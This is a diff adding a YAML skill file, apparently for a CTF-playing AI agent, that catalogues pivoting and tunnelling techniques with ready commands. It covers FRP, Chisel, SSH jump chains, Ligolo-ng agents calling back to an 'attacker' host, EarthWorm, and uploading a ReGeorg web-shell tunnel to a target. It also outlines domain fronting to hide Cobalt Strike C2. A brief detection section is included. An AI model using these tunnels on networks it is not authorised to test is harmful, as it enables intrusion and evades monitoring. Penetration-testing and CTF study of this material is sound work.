@@ -1,0 +1,591 @@
+name: proxy_chain
+description: 多层代理链构建 - 涵盖FRP、Chisel、SSH隧道链、SOCKS代理、多层跳板构建技术
+version: "2.0"
+author: CTF-Agent Team
+tags: [proxy, tunnel, frp, chisel, ssh, socks, pivot]
+priority: medium
+
+# 使用场景
+scenarios:
+  - 多层内网穿透
+  - 跨域边界访问
+  - 隐蔽C2通信
+  - 复杂环境横向移动
+  - 堡垒机绕过
+
+# 核心技术
+techniques:
+  - FRP代理: 高性能反向代理工具
+  - Chisel隧道: 跨平台HTTP隧道
+  - SSH隧道链: 多跳SSH端口转发
+  - SOCKS代理: 多层SOCKS代理链
+  - 反向代理: 从内网反向连接外网
+  - 域前置: CDN隐藏真实代理地址
+
+# 工具列表
+tools:
+  - FRP: 高性能反向代理
+  - Chisel: HTTP/SOCKS隧道
+  - SSH: 原生SSH隧道
+  - Proxychains: 代理链工具
+  - Ncat: 多功能网络工具
+  - Ligolo-ng: 隐蔽隧道工具
+  - EarthWorm (EW): 多功能跳板工具
+  - Termite: EW改进版
+  - ReGeorg: Web代理隧道
+
+# 基础概念
+concepts:
+  - proxy_types:
+      forward_proxy: 客户端通过代理访问外部
+      reverse_proxy: 内网服务通过代理暴露到外网
+      socks_proxy: 支持任意TCP连接的代理
+      http_proxy: 仅支持HTTP协议的代理
+
+  - tunnel_types:
+      port_forwarding: 单端口转发
+      dynamic_forwarding: 动态SOCKS代理
+      reverse_tunnel: 反向端口转发
+      multi_hop: 多跳隧道链
+
+# FRP代理配置
+frp_proxy:
+  - basic_setup:
+    template: |
+      # FRP (Fast Reverse Proxy)
+
+      # 1. 服务器端配置 (frps.ini)
+      [common]
+      bind_port = 7000
+      token = your_auth_token
+      dashboard_port = 7500
+      dashboard_user = admin
+      dashboard_pwd = admin
+
+      # 2. 客户端配置 (frpc.ini)
+      [common]
+      server_addr = your_server.com
+      server_port = 7000
+      token = your_auth_token
+
+      # 3. 启动
+      # 服务器
+      ./frps -c frps.ini
+
+      # 客户端
+      ./frpc -c frpc.ini
+
+  - port_forwarding:
+    template: |
+      # FRP端口转发
+
+      # frpc.ini
+
+      # 本地端口转发到远程
+      [ssh]
+      type = tcp
+      local_ip = 127.0.0.1
+      local_port = 22
+      remote_port = 6000
+
+      # Web服务转发
+      [web]
+      type = tcp
+      local_ip = 127.0.0.1
+      local_port = 80
+      remote_port = 8080
+
+      # 多端口转发
+      [range:multi_ports]
+      type = tcp
+      local_ip = 127.0.0.1
+      local_port = 10000-10010
+      remote_port = 10000-10010
+
+  - socks_proxy:
+    template: |
+      # FRP SOCKS代理
+
+      # frpc.ini
+
+      # SOCKS5代理
+      [socks5]
+      type = tcp
+      remote_port = 1080
+      plugin = socks5
+      plugin_user = proxy_user
+      plugin_passwd = proxy_pass
+
+      # 使用代理
+      proxychains nmap -sT target_internal
+
+  - http_proxy:
+    template: |
+      # FRP HTTP代理
+
+      # frpc.ini
+
+      [http_proxy]
+      type = tcp
+      remote_port = 8080
+      plugin = http_proxy
+
+      # HTTPS配置
+      [https_proxy]
+      type = tcp
+      remote_port = 8443
+      plugin = https_proxy
+
+  - stcp_secret:
+    template: |
+      # FRP STCP (Secret TCP) - 安全TCP
+      # 需要预共享密钥
+
+      # 被访问端 frpc.ini
+      [secret_ssh]
+      type = stcp
+      sk = your_secret_key
+      local_ip = 127.0.0.1
+      local_port = 22
+
+      # 访问端 frpc.ini
+      [secret_ssh_visitor]
+      type = stcp
+      role = visitor
+      sk = your_secret_key
+      server_name = secret_ssh
+      bind_addr = 127.0.0.1
+      bind_port = 2222
+
+      # 连接
+      ssh -p 2222 user@127.0.0.1
+
+# Chisel隧道
+chisel_tunnel:
+  - basic_usage:
+    template: |
+      # Chisel - HTTP/SOCKS隧道
+
+      # 1. 服务器端
+      ./chisel server -p 8080 --reverse
+
+      # 2. 客户端 - 创建反向SOCKS代理
+      ./chisel client server:8080 R:socks
+
+      # 默认SOCKS端口: 1080
+
+      # 3. 使用代理
+      proxychains nmap -sT internal_target
+
+      # 4. 端口转发
+      # 将内网服务转发到服务器
+      ./chisel client server:8080 R:8081:internal_host:80
+
+      # 5. 多端口转发
+      ./chisel client server:8080 \
+        R:8081:internal_host:80 \
+        R:8082:internal_host:3306 \
+        R:socks
+
+  - advanced_features:
+    template: |
+      # Chisel高级功能
+
+      # 1. 认证
+      ./chisel server -p 8080 --auth user:pass --reverse
+      ./chisel client --auth user:pass server:8080 R:socks
+
+      # 2. SOCKS代理链
+      # 多层Chisel代理
+
+      # 跳板1 -> 跳板2 -> 目标
+      # 跳板1: chisel server -p 8080 --reverse
+      # 跳板2: chisel client jump1:8080 R:socks
+      # 攻击机: 通过跳板2的SOCKS访问
+
+      # 3. Keepalive
+      ./chisel client --keepalive 30s server:8080 R:socks
+
+      # 4. 最大连接数
+      ./chisel server --max-conn-count 100
+
+# SSH隧道链
+ssh_tunnel:
+  - local_port_forward:
+    template: |
+      # SSH本地端口转发
+
+      # 基础: 将远程端口转发到本地
+      ssh -L local_port:remote_host:remote_port user@ssh_server
+
+      # 示例: 访问内网Web服务
+      ssh -L 8080:internal_web:80 user@jump_host
+
+      # 访问: http://localhost:8080
+
+      # 多端口转发
+      ssh -L 8080:internal_web:80 \
+          -L 3306:internal_db:3306 \
+          user@jump_host
+
+  - remote_port_forward:
+    template: |
+      # SSH远程端口转发 (反向)
+
+      # 将本地端口转发到远程
+      ssh -R remote_port:local_host:local_port user@ssh_server
+
+      # 示例: 暴露内网服务到远程
+      ssh -R 8080:internal_host:80 user@external_server
+
+      # 外部访问: external_server:8080
+
+      # 反向SOCKS代理 (需要配置)
+      ssh -R 1080:127.0.0.1:1080 user@external_server
+
+  - dynamic_forwarding:
+    template: |
+      # SSH动态端口转发 (SOCKS代理)
+
+      # 创建本地SOCKS代理
+      ssh -D 1080 user@ssh_server
+
+      # 使用代理
+      proxychains nmap -sT internal_target
+
+      # 配置proxychains
+      # /etc/proxychains.conf
+      [ProxyList]
+      socks5 127.0.0.1 1080
+
+  - multi_hop_chain:
+    template: |
+      # SSH多跳隧道链
+
+      # 方法1: ProxyCommand
+
+      # 从A跳到B再到C
+      ssh -o ProxyCommand="ssh -W %h:%p user@B" user@C
+
+      # 配置 ~/.ssh/config
+      Host jump2
+          HostName internal_host
+          User user
+          ProxyCommand ssh -W %h:%p user@jump1
+
+      # 直接连接
+      ssh jump2
+
+      # 方法2: 多层端口转发
+
+      # 第一跳
+      ssh -L 2222:jump2:22 user@jump1
+
+      # 第二跳 (通过本地2222)
+      ssh -L 3333:target:22 -p 2222 user@localhost
+
+      # 方法3: Proxychains + SSH
+
+      # 配置proxychains链
+      [ProxyList]
+      socks5 127.0.0.1 1080  # 第一跳SOCKS
+      socks5 127.0.0.1 1081  # 第二跳SOCKS
+
+      # 通过链SSH
+      proxychains ssh user@target
+
+  - ssh_config_tricks:
+    template: |
+      # SSH配置技巧
+
+      # ~/.ssh/config
+
+      # 基础跳板配置
+      Host jump1
+          HostName jump1.example.com
+          User admin
+          Port 22
+          IdentityFile ~/.ssh/jump1.key
+
+      # 通过jump1访问jump2
+      Host jump2
+          HostName 10.0.0.2
+          User admin
+          ProxyJump jump1
+
+      # 通过多跳访问目标
+      Host target
+          HostName 10.0.1.100
+          User root
+          ProxyJump jump1,jump2
+
+      # 自动SOCKS代理
+      Host jump1-proxy
+          HostName jump1.example.com
+          DynamicForward 1080
+
+      # 连接
+      ssh target  # 自动通过跳板链
+
+# SOCKS代理链
+socks_chain:
+  - proxychains_config:
+    template: |
+      # Proxychains配置
+
+      # /etc/proxychains.conf 或 proxychains4.conf
+
+      # 严格链模式 (必须全部成功)
+      strict_chain
+
+      # 动态链模式 (跳过失败的)
+      dynamic_chain
+
+      # 随机链模式 (随机顺序)
+      random_chain
+
+      # 代理列表
+      [ProxyList]
+      socks5 127.0.0.1 1080
+      socks5 127.0.0.1 1081
+      http 127.0.0.1 8080
+
+      # 使用
+      proxychains nmap -sT target
+      proxychains curl http://internal_site
+
+  - multi_level_socks:
+    template: |
+      # 多层SOCKS代理链
+
+      # 构建三层代理链
+
+      # 第一层: 本地 -> 跳板A
+      ssh -D 1080 user@jumpA
+
+      # 第二层: 通过A到B
+      # 在A上执行
+      ssh -D 1081 user@jumpB
+
+      # 或者使用ssh嵌套
+      ssh -D 1080 user@jumpA
+      # 然后在本地配置proxychains
+      proxychains ssh -D 1081 user@jumpB
+
+      # 第三层: 通过B到C
+      ssh -D 1082 user@jumpC
+
+      # proxychains.conf
+      [ProxyList]
+      socks5 127.0.0.1 1080
+      socks5 127.0.0.1 1081
+      socks5 127.0.0.1 1082
+
+      # 使用链
+      proxychains nmap -sT final_target
+
+# Ligolo-ng隐蔽隧道
+ligolo_tunnel:
+  - template: |
+      # Ligolo-ng - 隐蔽隧道工具
+
+      # 优势: 不需要SOCKS代理，直接路由
+
+      # 1. 服务器端 (攻击机)
+      ./proxy -selfcert
+
+      # 2. 客户端/Agent (目标机器)
+      ./agent -connect attacker:11601 -ignore-cert
+
+      # 3. 在proxy中添加隧道
+      session --name target
+      tunnel start --tun ligolo
+
+      # 4. 添加路由
+      # 添加目标内网路由
+      ip route add 10.0.0.0/24 dev ligolo
+
+      # 5. 直接访问
+      nmap -sT 10.0.0.1
+      curl http://10.0.0.1
+
+      # 6. 多个隧道
+      # 添加多个Agent的隧道
+      session --name target2
+      tunnel start --tun ligolo2
+
+# EarthWorm (EW)跳板工具
+earthworm:
+  - template: |
+      # EarthWorm (EW) - 多功能跳板工具
+
+      # 注意: 在国内CTF常用，但可能被标记
+
+      # 模式:
+      # ssocksd: SOCKS服务端
+      # rssocks: 反向SOCKS
+      # lcx_listen: 端口转发监听
+      # lcx_tran: 端口转发
+      # lcx_slave: 端口转发客户端
+
+      # 1. 正向SOCKS代理
+      ./ew -s ssocksd -l 1080
+
+      # 2. 反向SOCKS代理
+      # 外网服务器
+      ./ew -s lcx_listen -l 1080 -e 8888
+
+      # 内网机器
+      ./ew -s rssocks -d external_ip -e 8888
+
+      # 3. 多级跳板
+      # 外网服务器
+      ./ew -s lcx_listen -l 1080 -e 8888
+
+      # 一级跳板
+      ./ew -s lcx_slave -d external_ip -e 8888 -f jump2_ip -g 9999
+
+      # 二级跳板
+      ./ew -s rssocks -d jump1_ip -e 9999
+
+# Termite改进版跳板
+termite:
+  - template: |
+      # Termite - EW改进版
+
+      # 特点: 更隐蔽、支持多节点
+
+      # 1. 控制端
+      ./termite -l 8888
+
+      # 2. 节点连接
+      ./termite -c controller:8888
+
+      # 3. 在节点内操作
+      # 添加SOCKS代理
+      termite> socks 1080
+
+      # 端口转发
+      termite> forward 8080 internal_host:80
+
+      # 多节点管理
+      termite> nodes
+
+      # 选择节点
+      termite> use node1
+
+# ReGeorg Web代理隧道
+regeorg:
+  - template: |
+      # ReGeorg - Web代理隧道
+
+      # 通过Web服务器建立代理
+
+      # 1. 上传tunnel.jsp/php/aspx到目标Web服务器
+
+      # 2. 连接
+      python reGeorgSocksProxy.py \
+        -u http://target.com/tunnel.jsp \
+        -p 1080
+
+      # 3. 使用代理
+      proxychains nmap -sT internal_host
+
+      # 4. 带密码
+      python reGeorgSocksProxy.py \
+        -u http://target.com/tunnel.jsp \
+        -p 1080 \
+        -l password123
+
+# 域前置技术
+domain_fronting:
+  - template: |
+      # Domain Fronting - 域前置
+
+      # 通过CDN隐藏真实C2地址
+
+      # 原理:
+      # 请求Host头指向恶意域名
+      # SNI指向合法域名
+      # CDN根据SNI转发
+
+      # 1. 选择CDN提供商
+      # Cloudflare, AWS CloudFront, Azure CDN
+
+      # 2. 配置C2
+      # Cobalt Strike Malleable C2 Profile
+
+      # 3. 配置域前置
+      # 在C2 profile中配置
+
+      # 使用合法域名作为front
+      # 如: cdn.microsoft.com, cdn.cloudflare.com
+
+      # 实际连接到恶意域名
+
+# 代理链自动化脚本
+automation:
+  - template: |
+      # Python代理链自动化
+
+      import socket
+      import socks
+      import subprocess
+
+      class ProxyChainManager:
+          def __init__(self):
+              self.chain = []
+
+          def add_ssh_socks(self, host, port, user):
+              """添加SSH SOCKS代理"""
+              cmd = f"ssh -D {port} -f -N {user}@{host}"
+              subprocess.Popen(cmd, shell=True)
+              self.chain.append(("socks5", "127.0.0.1", port))
+
+          def add_chisel(self, server, port):
+              """添加Chisel代理"""
+              cmd = f"./chisel client {server}:{port} R:socks"
+              subprocess.Popen(cmd, shell=True)
+              self.chain.append(("socks5", "127.0.0.1", "1080"))
+
+          def configure_proxychains(self):
+              """配置proxychains"""
+              config = "dynamic_chain\n\n[ProxyList]\n"
+              for proxy in self.chain:
+                  config += f"{proxy[0]} {proxy[1]} {proxy[2]}\n"
+
+              with open("/etc/proxychains.conf", "w") as f:
+                  f.write(config)
+
+          def test_chain(self, target):
+              """测试代理链"""
+              return subprocess.run(
+                  f"proxychains curl -I {target}",
+                  shell=True, capture_output=True
+              )
+
+# 防御检测
+detection:
+  - 代理隧道检测:
+      - 监控异常网络连接模式
+      - 检测非标准端口流量
+      - 分析加密流量特征
+      - 监控SSH会话行为
+      - 检测长期稳定的连接
+
+  - 防御建议:
+      - 实施严格的出站防火墙规则
+      - 监控DNS异常请求
+      - 检测HTTP流量异常
+      - 实施零信任网络架构
+      - 定期审计网络连接
+
+# 参考资源
+references:
+  - https://github.com/fatedier/frp
+  - https://github.com/jpillora/chisel
+  - https://github.com/nicocha30/ligolo-ng
+  - https://github.com/sensepost/reGeorg
+  - https://github.com/Bl00Df0x/EarthWorm
+  - https://github.com/rofl0r/proxychains-ng
+  - https://attack.mitre.org/techniques/T1090/
